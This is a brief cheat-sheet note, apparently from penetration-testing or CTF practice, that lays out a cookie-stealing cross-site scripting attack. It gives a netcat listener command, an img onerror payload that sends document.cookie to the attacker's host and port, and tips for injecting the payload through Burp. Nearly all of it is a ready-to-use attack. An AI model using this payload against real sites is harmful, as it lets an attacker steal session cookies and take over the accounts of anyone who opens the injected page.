Cross-site scripting to steal the cookie of the user that opens our script:

Step 1(host): nc -lvnp <port> 	# or any other listener, python SimpleHTTPServer works too
Step 2(host): <img src=x onerror=this.src="http://<hostIP>:<port>/?c="+document.cookie>		# insert this code in the body of a textfield (via burp, preferably, possibly URL-encoded)
Step 3(host): wait for the connection with the cookie
